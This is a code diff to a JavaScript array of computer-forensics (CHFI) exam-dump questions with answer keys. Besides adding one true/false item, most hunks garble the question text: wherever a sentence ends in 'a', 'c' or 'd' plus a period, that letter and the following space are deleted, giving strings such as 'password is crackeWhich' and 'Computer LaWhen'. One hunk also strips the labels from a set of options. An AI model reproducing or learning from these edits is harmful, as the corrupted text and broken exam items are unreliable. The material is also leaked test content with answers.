@@ -288,6 +288,13 @@ export const CHFI_DUMP_QUESTIONS = [
     correctAnswer: 1,
   },
   {
+    id: 30,
+    question:
+      "If you discover a criminal act while investigating a corporate policy abuse, it becomes a publicsector investigation and should be referred to law enforcement?",
+    options: ["true", "false"],
+    correctAnswer: 0,
+  },
+  {
     id: 31,
     question: "Which Windows registry datatype stores encoded info?",
     options: [
@@ -2041,7 +2048,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 213,
     question:
-      "Bob discovered password-protected files during a forensic investigation and initiated a password-cracking technique that tries every possible combination of characters until the password is cracked. Which technique did Bob use?",
+      "Bob discovered password-protected files during a forensic investigation and initiated a password-cracking technique that tries every possible combination of characters until the password is crackeWhich technique did Bob use?",
     options: [
       "Pass-the-ticket attack",
       "Brute-force attack",
@@ -2507,7 +2514,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 265,
     question:
-      "When an investigator contacts by telephone the domain administrator or controller listed by a Who is lookup to request all e-mails sent and received for a user account be preserved, what U.S.C. statute authorizes this phone call and obligates the ISP to preserve e-mail records?",
+      "When an investigator contacts by telephone the domain administrator or controller listed by a Who is lookup to request all e-mails sent and received for a user account be preserved, what U.S.statute authorizes this phone call and obligates the ISP to preserve e-mail records?",
     options: [
       "Title 18, Section 1030",
       "Title 18, Section 2703(d)",
@@ -2631,7 +2638,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 277,
     question:
-      "A suspect is accused of violating the acceptable use of computing resources, as he has visited adult websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover, he has removed any images he might have downloaded. What can the investigator do to prove the violation?",
+      "A suspect is accused of violating the acceptable use of computing resources, as he has visited adult websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover, he has removed any images he might have downloadeWhat can the investigator do to prove the violation?",
     options: [
       "Image the disk and try to recover deleted files",
       "Seek the help of co-workers who are eye-witnesses",
@@ -2793,10 +2800,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Chloe is a forensic examiner who is currently cracking hashed passwords for a crucial mission and hopefully solve the case. She is using a lookup table used for recovering a plain text password from cipher text; it contains word list and brute-force list along with their computed hash values. Chloe is also using a graphical generator that supports SHA1.\n(a) What password technique is being used?\n(b) What tool is Chloe using?",
     options: [
-      "a. Cain & Able b. Rten",
-      "a. Rainbow Tables b. Winrtgen",
-      "a. Dictionary attack b. Cisco PIX",
-      "a. Brute-force b. MScache",
+      "Cain & Able Rten",
+      "Rainbow Tables Winrtgen",
+      "Dictionary attack Cisco PIX",
+      "Brute-force MScache",
     ],
     correctAnswer: 1,
   },
@@ -2894,14 +2901,14 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 313,
     question:
-      "When analyzing logs, it is important that the clocks of all the network devices are synchronized. Which protocol will help in synchronizing these clocks?",
+      "When analyzing logs, it is important that the clocks of all the network devices are synchronizeWhich protocol will help in synchronizing these clocks?",
     options: ["UTC", "PTP", "Time Protocol", "NTP"],
     correctAnswer: 3,
   },
   {
     id: 314,
     question:
-      "During the course of his investigation, Vincent came across a situation where he needs to run a packet sniffing tool on a Linux-based machine to monitor the network traffic. Which tool should Vincent choose in this case?",
+      "During the course of his investigation, Vincent came across a situation where he needs to run a packet sniffing tool on a Linux-based machine to monitor the network traffiWhich tool should Vincent choose in this case?",
     options: ["Tcpdump", "Balbuzard", "CurrPorts", "DumpIt"],
     correctAnswer: 0,
   },
@@ -2950,7 +2957,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 319,
     question:
-      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer Lab. When you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a 'simple backup copy' of the hard drive in the PC and put it on this drive and requests that you examine the drive for evidence of the suspected images. You inform him that a 'simple backup copy' will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
+      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer LaWhen you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a 'simple backup copy' of the hard drive in the PC and put it on this drive and requests that you examine the drive for evidence of the suspected images. You inform him that a 'simple backup copy' will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
     options: [
       "Robust copy",
       "Incremental backup copy",
@@ -2962,7 +2969,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 320,
     question:
-      "Sally accessed the computer system that holds trade secrets of the company where she is employed. She knows she accessed it without authorization and all access (authorized and unauthorized) to this computer is monitored. To cover her tracks, Sally deleted the log entries on this computer. What among the following best describes her action?",
+      "Sally accessed the computer system that holds trade secrets of the company where she is employeShe knows she accessed it without authorization and all access (authorized and unauthorized) to this computer is monitoreTo cover her tracks, Sally deleted the log entries on this computer. What among the following best describes her action?",
     options: [
       "Password sniffing",
       "Brute-force attack",
@@ -3017,7 +3024,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 325,
     question:
-      "You are a forensic investigator who is analyzing a hard drive that was recently collected as evidence. You have been unsuccessful at locating any meaningful evidence within the file system and suspect a drive wiping utility may have been used. You have reviewed the keys within the software hive of the Windows registry and did not find any drive wiping utilities. How can you verify that drive wiping software was used on the hard drive?",
+      "You are a forensic investigator who is analyzing a hard drive that was recently collected as evidence. You have been unsuccessful at locating any meaningful evidence within the file system and suspect a drive wiping utility may have been useYou have reviewed the keys within the software hive of the Windows registry and did not find any drive wiping utilities. How can you verify that drive wiping software was used on the hard drive?",
     options: [
       "Check the list of installed programs",
       "Load various drive wiping utilities offline, and export previous run reports",
@@ -3048,7 +3055,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 328,
     question:
-      "A forensic examiner encounters a computer with a failed OS installation and the master boot record (MBR) or partition sector damaged. Which of the following tools can find and restore files and information in the disk?",
+      "A forensic examiner encounters a computer with a failed OS installation and the master boot record (MBR) or partition sector damageWhich of the following tools can find and restore files and information in the disk?",
     options: ["Helix", "R-Studio", "Wireshark", "NetCat"],
     correctAnswer: 1,
   },
@@ -3085,7 +3092,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 332,
     question:
-      "You have been asked to investigate the possibility of computer fraud in the finance department of a company. It is suspected that a staff member has been committing finance fraud by printing cheques that have not been authorized. You have exhaustively searched all data files on a bitmap image of the target computer, but have found no evidence. You suspect the files may not have been saved. What should you examine next in this case?",
+      "You have been asked to investigate the possibility of computer fraud in the finance department of a company. It is suspected that a staff member has been committing finance fraud by printing cheques that have not been authorizeYou have exhaustively searched all data files on a bitmap image of the target computer, but have found no evidence. You suspect the files may not have been saveWhat should you examine next in this case?",
     options: [
       "The registry",
       "The swap file",
@@ -3145,7 +3152,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 337,
     question:
-      "Debbie has obtained a warrant to search a known pedophile's house. Debbie went to the house and executed the search warrant to seize digital devices that have been recorded as being used for downloading illicit images. She seized all digital devices except a digital camera. Why did she not collect the digital camera?",
+      "Debbie has obtained a warrant to search a known pedophile's house. Debbie went to the house and executed the search warrant to seize digital devices that have been recorded as being used for downloading illicit images. She seized all digital devices except a digital camerWhy did she not collect the digital camera?",
     options: [
       "Debbie overlooked the digital camera because it is not a computer system",
       "The digital camera was not listed as one of the digital devices in the warrant",
@@ -3345,14 +3352,14 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 357,
     question:
-      "Frank, a cloud administrator in his company, needs to take backup of the OS disks of two Azure VMs that store business-critical data. Which type of Azure blob storage can he use for this purpose?",
+      "Frank, a cloud administrator in his company, needs to take backup of the OS disks of two Azure VMs that store business-critical datWhich type of Azure blob storage can he use for this purpose?",
     options: ["Append blob", "Medium blob", "Block blob", "Page blob"],
     correctAnswer: 3,
   },
   {
     id: 358,
     question:
-      "During a forensic investigation, a large number of files were collected. The investigator needs to evaluate ownership and accountability of those files. Therefore, he begins to identify attributes such as “author name”, “organization name”, “network name”, or any additional supporting data that is meant for the owner’s identification purpose. Which term describes these attributes?",
+      "During a forensic investigation, a large number of files were collecteThe investigator needs to evaluate ownership and accountability of those files. Therefore, he begins to identify attributes such as “author name”, “organization name”, “network name”, or any additional supporting data that is meant for the owner’s identification purpose. Which term describes these attributes?",
     options: ["Data index", "Metabase", "Data header", "Metadata"],
     correctAnswer: 3,
   },
@@ -3639,7 +3646,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 384,
     question:
-      "Jacob is a computer forensics investigator with over 10 years experience in investigations and has written over 50 articles on computer forensics. He has been called upon as a qualified witness to testify the accuracy and integrity of the technical log files gathered in an investigation into computer fraud. What is the term used for Jacob's testimony in this case?",
+      "Jacob is a computer forensics investigator with over 10 years experience in investigations and has written over 50 articles on computer forensics. He has been called upon as a qualified witness to testify the accuracy and integrity of the technical log files gathered in an investigation into computer frauWhat is the term used for Jacob's testimony in this case?",
     options: [
       "Justification",
       "Reiteration",
@@ -3700,7 +3707,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 390,
     question:
-      "After a successful data exfiltration attack against your organization, you are conducting an internal investigation and suspect a significant portion of evidence exists on an end-user’s personal laptop. You want to be sure not to tip-off the laptop’s owner that an investigation is being conducted. What is the best option to obtain the evidence?",
+      "After a successful data exfiltration attack against your organization, you are conducting an internal investigation and suspect a significant portion of evidence exists on an end-user’s personal laptop. You want to be sure not to tip-off the laptop’s owner that an investigation is being conducteWhat is the best option to obtain the evidence?",
     options: [
       "Confiscate the laptop",
       "Request the laptop owner to voluntarily surrender it",
@@ -3748,7 +3755,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 394,
     question:
-      "This is a statement, other than one made by the declarant while testifying at the trial or hearing, offered in evidence to prove the truth of the matter asserted. Which among the following is suitable for the above statement?",
+      "This is a statement, other than one made by the declarant while testifying at the trial or hearing, offered in evidence to prove the truth of the matter asserteWhich among the following is suitable for the above statement?",
     options: [
       "Rule 1001",
       "Hearsay rule",
@@ -3783,7 +3790,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 397,
     question:
-      "James, a hacker, identifies a vulnerability in a website. To exploit the vulnerability, he visits the login page and notes down the session ID that is created. He appends this session ID to the login URL and shares the link with a victim. Once the victim logs into the website using the shared URL, James reloads the webpage (containing the URL with the session ID appended) and now, he can browse the active session of the victim. Which attack did James successfully execute?",
+      "James, a hacker, identifies a vulnerability in a website. To exploit the vulnerability, he visits the login page and notes down the session ID that is createHe appends this session ID to the login URL and shares the link with a victim. Once the victim logs into the website using the shared URL, James reloads the webpage (containing the URL with the session ID appended) and now, he can browse the active session of the victim. Which attack did James successfully execute?",
     options: [
       "Session Fixation Attack",
       "Cookie Tampering",
@@ -3814,7 +3821,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 400,
     question:
-      'Consider that you are investigating a machine running an Windows OS released prior to Windows Vista. You are trying to gather information about the deleted files by examining the master database file named INFO2 located at C:\\Recycler\\<USER SID>\\. You read an entry named "Dd5.exe". What does Dd5.exe mean?',
+      'Consider that you are investigating a machine running an Windows OS released prior to Windows VistYou are trying to gather information about the deleted files by examining the master database file named INFO2 located at C:\\Recycler\\<USER SID>\\. You read an entry named "Dd5.exe". What does Dd5.exe mean?',
     options: [
       "D drive. fifth file deleted, a .exe file",
       "D drive, fourth file restored, a .exe file",
@@ -4017,7 +4024,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 419,
     question:
-      "Jacky encrypts her documents using a password. It is known that she uses her daughter's year of birth as part of the password. Which password cracking technique would be optimal to crack her password?",
+      "Jacky encrypts her documents using a passworIt is known that she uses her daughter's year of birth as part of the passworWhich password cracking technique would be optimal to crack her password?",
     options: [
       "Hybrid attack",
       "Brute force attack",
@@ -4119,7 +4126,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 431,
     question:
-      "BMP (Bitmap) is a standard file format for computers running the Windows operating system. BMP images can range from black and white (1 bit per pixel) up to 24 bit color (16.7 million colors). Each bitmap file contains a header, the RGBQUAD array, information header, and image data. Which of the following element specifies the dimensions, compression type, and color format for the bitmap?",
+      "BMP (Bitmap) is a standard file format for computers running the Windows operating system. BMP images can range from black and white (1 bit per pixel) up to 24 bit color (16.7 million colors). Each bitmap file contains a header, the RGBQUAD array, information header, and image datWhich of the following element specifies the dimensions, compression type, and color format for the bitmap?",
     options: [
       "Image data",
       "Information header",
@@ -4198,7 +4205,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 438,
     question:
-      "Tony, an email marketing professional, is accused of enticing people to reveal their personal information such as banking credentials, credit card details, bank details, etc. via phishing emails. What type of investigation will apply to Tony’s case?",
+      "Tony, an email marketing professional, is accused of enticing people to reveal their personal information such as banking credentials, credit card details, bank details, etvia phishing emails. What type of investigation will apply to Tony’s case?",
     options: ["Civil", "None of these", "Administrative", "Criminal"],
     correctAnswer: 3,
   },
@@ -4236,7 +4243,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 442,
     question:
-      "An investigator needs to perform data acquisition from a storage media without altering its contents to maintain the integrity of the content. The approach adopted by the investigator relies upon the capacity of enabling read-only access to the storage media. Which tool should the investigator integrate into his/her procedures to accomplish this task?",
+      "An investigator needs to perform data acquisition from a storage media without altering its contents to maintain the integrity of the content. The approach adopted by the investigator relies upon the capacity of enabling read-only access to the storage mediWhich tool should the investigator integrate into his/her procedures to accomplish this task?",
     options: [
       "Data duplication tool",
       "Backup tool",
@@ -4767,7 +4774,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 500,
     question:
-      "During forensics investigations, investigators tend to collect the system time at first and compare it with UTC. What does the abbreviation UTC stand for?",
+      "During forensics investigations, investigators tend to collect the system time at first and compare it with UTWhat does the abbreviation UTC stand for?",
     options: [
       "Correlated Universal Time",
       "Universal Time for Computers",
@@ -5019,7 +5026,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 525,
     question:
-      "Which network attack is described by the following statement? 'At least five Russian major banks came under a continuous hacker attack, although online client services were not disrupted. The attack came from a wide-scale botnet involving at least 24,000 computers, located in 30 countries.'",
+      "Which network attack is described by the following statement? 'At least five Russian major banks came under a continuous hacker attack, although online client services were not disrupteThe attack came from a wide-scale botnet involving at least 24,000 computers, located in 30 countries.'",
     options: [
       "Man-in-the-Middle Attack",
       "Sniffer Attack",
@@ -5031,7 +5038,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 526,
     question:
-      "Jason discovered a file named $RIYG6VR.doc in the C:\\$Recycle.Bin\\<USER SID>\\ while analyzing a hard disk image for the deleted data. What inferences can he make from the file name?",
+      "Jason discovered a file named $RIYG6VR.doc in the C:\\$Recycle.Bin\\<USER SID>\\ while analyzing a hard disk image for the deleted datWhat inferences can he make from the file name?",
     options: [
       "It is a doc file deleted in seventh sequential order",
       "RIYG6VR.doc is the name of the doc file deleted from the system",
@@ -5086,7 +5093,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 531,
     question:
-      "A forensic examiner is examining a Windows system seized from a crime scene. During the examination of a suspect file, he discovered that the file is password protected. He tried guessing the password using the suspect's available information but without any success. Which of the following tool can help the investigator to solve this issue?",
+      "A forensic examiner is examining a Windows system seized from a crime scene. During the examination of a suspect file, he discovered that the file is password protecteHe tried guessing the password using the suspect's available information but without any success. Which of the following tool can help the investigator to solve this issue?",
     options: ["Cain & Abel", "Xplico", "Colasoft’s Capsa", "Recuva"],
     correctAnswer: 0,
   },
@@ -5100,7 +5107,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 533,
     question:
-      "As a part of the investigation, Caroline, a forensic expert, was assigned the task to examine the transaction logs pertaining to a database named Transfers. She used SQL Server Management Studio to collect the active transaction log files of the database. Caroline wants to extract detailed information on the logs, including AllocUnitId, page id, slot id, etc. Which of the following commands does she need to execute in order to extract the desired information?",
+      "As a part of the investigation, Caroline, a forensic expert, was assigned the task to examine the transaction logs pertaining to a database named Transfers. She used SQL Server Management Studio to collect the active transaction log files of the database. Caroline wants to extract detailed information on the logs, including AllocUnitId, page id, slot id, etWhich of the following commands does she need to execute in order to extract the desired information?",
     options: [
       "DBCC LOG(Transfers, 1)",
       "DBCC LOG(Transfers, 3)",
@@ -5306,7 +5313,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 554,
     question:
-      "Common Apache log format is %h%I%u%t\\”%>s%b. What does %b represent in the log format?",
+      "Common Apache log format is %h%I%u%t\\”%>s%What does %b represent in the log format?",
     options: [
       "The status code that the server sends back to the client",
       "The client’s IP address",
@@ -5541,7 +5548,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 577,
     question:
-      "Smith, as a part his forensic investigation assignment, seized a mobile device. He was asked to recover the Subscriber Identity Module (SIM) card data in the mobile device. Smith found that the SIM was protected by a Personal Identification Number (PIN) code, but he was also aware that people generally leave the PIN numbers to the defaults or use easily guessable numbers such as 1234. He made three unsuccessful attempts, which blocked the SIM card. What can Jason do in this scenario to reset the PIN and access SIM data?",
+      "Smith, as a part his forensic investigation assignment, seized a mobile device. He was asked to recover the Subscriber Identity Module (SIM) card data in the mobile device. Smith found that the SIM was protected by a Personal Identification Number (PIN) code, but he was also aware that people generally leave the PIN numbers to the defaults or use easily guessable numbers such as 1234. He made three unsuccessful attempts, which blocked the SIM carWhat can Jason do in this scenario to reset the PIN and access SIM data?",
     options: [
       "He should contact the network operator for a Temporary Unlock Code (TUK)",
       "Use system and hardware tools to gain access",
@@ -5684,7 +5691,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 592,
     question:
-      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer lab. When you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a “simple backup copy” of the hard drive in the PC and put it on this drive and requests that you examine that drive for evidence of the suspected images. You inform him that a “simple backup copy” will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
+      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer laWhen you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a “simple backup copy” of the hard drive in the PC and put it on this drive and requests that you examine that drive for evidence of the suspected images. You inform him that a “simple backup copy” will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
     options: [
       "Bit-stream Copy",
       "Robust Copy",
@@ -5708,7 +5715,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 594,
     question:
-      "You are working as a Computer forensics investigator for a corporation on a computer abuse case. You discover evidence that shows the subject of your investigation is also embezzling money from the company. The company CEO and the corporate legal counsel advise you to contact law enforcement and provide them with the evidence that you have found. The law enforcement officer that responds requests that you put a network sniffer on your network and monitor all traffic to the subject’s computer. You inform the officer that you will not be able to comply with that request because doing so would:",
+      "You are working as a Computer forensics investigator for a corporation on a computer abuse case. You discover evidence that shows the subject of your investigation is also embezzling money from the company. The company CEO and the corporate legal counsel advise you to contact law enforcement and provide them with the evidence that you have founThe law enforcement officer that responds requests that you put a network sniffer on your network and monitor all traffic to the subject’s computer. You inform the officer that you will not be able to comply with that request because doing so would:",
     options: [
       "Violate your contract",
       "Cause network congestion",
@@ -5720,7 +5727,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 595,
     question:
-      "When reviewing web logs, you see an entry for resource not found in the HTTP status code field. What is the actual error code that you would see in the log for resource not found?",
+      "When reviewing web logs, you see an entry for resource not found in the HTTP status code fielWhat is the actual error code that you would see in the log for resource not found?",
     options: ["202", "404", "505", "909"],
     correctAnswer: 1,
   },
@@ -5830,7 +5837,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 609,
     question:
-      "Simon is a former employee of Trinitron XML Inc. He feels he was wrongly terminated and wants to hack into his former company's network. Since Simon remembers some of the server names, he attempts to run the axfr and ixfr commands using DIG. What is Simon trying to accomplish here?",
+      "Simon is a former employee of Trinitron XML InHe feels he was wrongly terminated and wants to hack into his former company's network. Since Simon remembers some of the server names, he attempts to run the axfr and ixfr commands using DIG. What is Simon trying to accomplish here?",
     options: [
       "Send DOS commands to crash the DNS servers",
       "Perform DNS poisoning",
@@ -5941,7 +5948,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 622,
     question:
-      "Julia is a senior security analyst for Berber Consulting group. She is currently working on a contract for a small accounting firm in Florida. They have given her permission to perform social engineering attacks on the company to see if their in-house training did any good. Julia calls the main number for the accounting firm and talks to the receptionist. Julia says that she is an IT technician from the company's main office in Iowa. She states that she needs the receptionist's network username and password to troubleshoot a problem they are having. Julia says that Bill Hammond, the CEO of the company, requested this information. After hearing the name of the CEO, the receptionist gave Julia all the information she asked for. What principal of social engineering did Julia use?",
+      "Julia is a senior security analyst for Berber Consulting group. She is currently working on a contract for a small accounting firm in FloridThey have given her permission to perform social engineering attacks on the company to see if their in-house training did any gooJulia calls the main number for the accounting firm and talks to the receptionist. Julia says that she is an IT technician from the company's main office in IowShe states that she needs the receptionist's network username and password to troubleshoot a problem they are having. Julia says that Bill Hammond, the CEO of the company, requested this information. After hearing the name of the CEO, the receptionist gave Julia all the information she asked for. What principal of social engineering did Julia use?",
     options: [
       "Social Validation",
       "Scarcity",
@@ -6032,7 +6039,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 632,
     question:
-      "You are contracted to work as a computer forensics investigator for a regional bank that has four 30 TB storage area networks that store customer data. What method would be most efficient for you to acquire digital evidence from this network?",
+      "You are contracted to work as a computer forensics investigator for a regional bank that has four 30 TB storage area networks that store customer datWhat method would be most efficient for you to acquire digital evidence from this network?",
     options: [
       "create a compressed copy of the file with DoubleSpace",
       "create a sparse data copy of a folder or file",
@@ -6186,7 +6193,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 648,
     question:
-      "When monitoring for both intrusion and security events between multiple computers, it is essential that the computers' clocks are synchronized. Synchronized time allows an administrator to reconstruct what took place during an attack against multiple computers. Without synchronized time, it is very difficult to determine exactly when specific events took place, and how events interlace. What is the name of the service used to synchronize time among multiple computers?",
+      "When monitoring for both intrusion and security events between multiple computers, it is essential that the computers' clocks are synchronizeSynchronized time allows an administrator to reconstruct what took place during an attack against multiple computers. Without synchronized time, it is very difficult to determine exactly when specific events took place, and how events interlace. What is the name of the service used to synchronize time among multiple computers?",
     options: [
       "Universal Time Set",
       "Network Time Protocol",
@@ -6370,7 +6377,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 683,
     question:
-      "Smith is an IT technician that has been appointed to his company's network vulnerability assessment team. He is the only IT employee on the team. The other team members include employees from Accounting, Management, Shipping, and Marketing. Smith and the team members are having their first meeting to discuss how they will proceed. What is the first step they should do to create the network vulnerability assessment plan?",
+      "Smith is an IT technician that has been appointed to his company's network vulnerability assessment team. He is the only IT employee on the team. The other team members include employees from Accounting, Management, Shipping, and Marketing. Smith and the team members are having their first meeting to discuss how they will proceeWhat is the first step they should do to create the network vulnerability assessment plan?",
     options: [
       "Their first step is to make a hypothesis of what their final findings will be.",
       "Their first step is to create an initial Executive report to show the management team.",
@@ -6412,7 +6419,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 687,
     question:
-      "A forensic examiner is examining a Windows system seized from a crime scene. During the examination of a suspect file, he discovered that the file is password protected. He tried guessing the password using the suspect’s available information but without any success. Which of the following tool can help the investigator to solve this issue?",
+      "A forensic examiner is examining a Windows system seized from a crime scene. During the examination of a suspect file, he discovered that the file is password protecteHe tried guessing the password using the suspect’s available information but without any success. Which of the following tool can help the investigator to solve this issue?",
     options: ["Cain & Abel", "Xplico", "Recuva", "Colasoft’s Capsa"],
     correctAnswer: 0,
   },
@@ -6493,7 +6500,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 695,
     question:
-      "Consider that you are investigating a machine running an Windows OS released prior to Windows Vista. You are trying to gather information about the deleted files by examining the master database file named INFO2 located at C:\\Recycler\\<USER SID>\\. You read an entry named 'Dd5.exe'. What does Dd5.exe mean?",
+      "Consider that you are investigating a machine running an Windows OS released prior to Windows VistYou are trying to gather information about the deleted files by examining the master database file named INFO2 located at C:\\Recycler\\<USER SID>\\. You read an entry named 'Dd5.exe'. What does Dd5.exe mean?",
     options: [
       "D drive",
       "fifth file deleted, a .exe file",
@@ -6586,7 +6593,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 706,
     question:
-      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer Lab. When you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a “simple backup copy” of the hard drive in the PC and put it on this drive and requests that you examine the drive for evidence of the suspected images. You inform him that a “simple backup copy” will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
+      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer LaWhen you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a “simple backup copy” of the hard drive in the PC and put it on this drive and requests that you examine the drive for evidence of the suspected images. You inform him that a “simple backup copy” will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
     options: [
       "Robust copy",
       "Incremental backup copy",
@@ -6798,7 +6805,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 737,
     question:
-      "You have been called in to help with an investigation of an alleged network intrusion. After questioning the members of the company IT department, you search through the server log files to find any trace of the intrusion. After that you decide to telnet into one of the company routers to see if there is any evidence to be found. While connected to the router, you see some unusual activity and believe that the attackers are currently connected to that router. You start up an ethereal session to begin capturing traffic on the router that could be used in the investigation. At what layer of the OSI model are you monitoring while watching traffic to and from the router?",
+      "You have been called in to help with an investigation of an alleged network intrusion. After questioning the members of the company IT department, you search through the server log files to find any trace of the intrusion. After that you decide to telnet into one of the company routers to see if there is any evidence to be founWhile connected to the router, you see some unusual activity and believe that the attackers are currently connected to that router. You start up an ethereal session to begin capturing traffic on the router that could be used in the investigation. At what layer of the OSI model are you monitoring while watching traffic to and from the router?",
     options: ["Network", "Transport", "Data Link", "Session"],
     correctAnswer: 0,
   },
@@ -6940,7 +6947,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 755,
     question:
-      "John is working on his company policies and guidelines. The section he is currently working on covers company documents; how they should be handled, stored, and eventually destroyed. John is concerned about the process whereby outdated documents are destroyed. What type of shredder should John write in the guidelines to be used when destroying documents?",
+      "John is working on his company policies and guidelines. The section he is currently working on covers company documents; how they should be handled, stored, and eventually destroyeJohn is concerned about the process whereby outdated documents are destroyeWhat type of shredder should John write in the guidelines to be used when destroying documents?",
     options: [
       "Strip-cut shredder",
       "Cross-cut shredder",
@@ -7021,7 +7028,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 764,
     question:
-      "While presenting his case to the court, Simon calls many witnesses to the stand to testify. Simon decides to call Hillary Taft, a lay witness, to the stand. Since Hillary is a lay witness, what field would she be considered an expert in?",
+      "While presenting his case to the court, Simon calls many witnesses to the stand to testify. Simon decides to call Hillary Taft, a lay witness, to the stanSince Hillary is a lay witness, what field would she be considered an expert in?",
     options: [
       "Technical material related to forensics",
       "No particular field",
@@ -7162,7 +7169,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 778,
     question:
-      "When an investigator contacts by telephone the domain administrator or controller listed by a whois lookup to request all e-mails sent and received for a user account be preserved, what U.S.C. statute authorizes this phone call and obligates the ISP to preserve e-mail records?",
+      "When an investigator contacts by telephone the domain administrator or controller listed by a whois lookup to request all e-mails sent and received for a user account be preserved, what U.S.statute authorizes this phone call and obligates the ISP to preserve e-mail records?",
     options: [
       "Title 18, Section 1030",
       "Title 18, Section 2703(d)",
@@ -7216,7 +7223,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 793,
     question:
-      "A suspect is accused of violating the acceptable use of computing resources, as he has visited adult websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover, he has removed any images he might have downloaded. What can the investigator do to prove the violation? Choose the most feasible option.",
+      "A suspect is accused of violating the acceptable use of computing resources, as he has visited adult websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover, he has removed any images he might have downloadeWhat can the investigator do to prove the violation? Choose the most feasible option.",
     options: [
       "Image the disk and try to recover deleted files",
       "Seek the help of co-workers who are eye-witnesses",
@@ -7240,7 +7247,7 @@ export const CHFI_DUMP_QUESTIONS = [
   {
     id: 809,
     question:
-      "You are assigned to work in the computer forensics lab of a state police agency. While working on a high profile criminal case, you have followed every applicable procedure, however your boss is still concerned that the defense attorney might question whether evidence has been changed while at the lab. What can you do to prove that the evidence is the same as it was when it first entered the lab?",
+      "You are assigned to work in the computer forensics lab of a state police agency. While working on a high profile criminal case, you have followed every applicable procedure, however your boss is still concerned that the defense attorney might question whether evidence has been changed while at the laWhat can you do to prove that the evidence is the same as it was when it first entered the lab?",
     options: [
       "make an MD5 hash of the evidence and compare it with the original MD5 hash that was taken when the evidence first entered the lab",
       "make an MD5 hash of the evidence and compare it to the standard database developed by NIST",
